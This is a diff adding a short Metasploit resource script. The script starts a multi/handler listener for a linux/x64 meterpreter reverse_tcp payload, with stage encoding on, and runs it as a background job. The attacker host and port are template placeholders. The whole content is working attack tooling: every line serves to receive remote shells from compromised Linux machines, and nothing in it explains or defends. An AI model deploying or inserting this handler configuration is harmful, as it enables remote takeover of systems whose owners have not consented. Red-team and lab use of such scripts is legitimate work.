@@ -1,0 +1,8 @@
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST !!!IP_MARK!!!
+set LPORT !!!PORT_MARK!!!  
+set exitonsession false
+set enablestageencoding true
+set exitfunc thread
+run -j
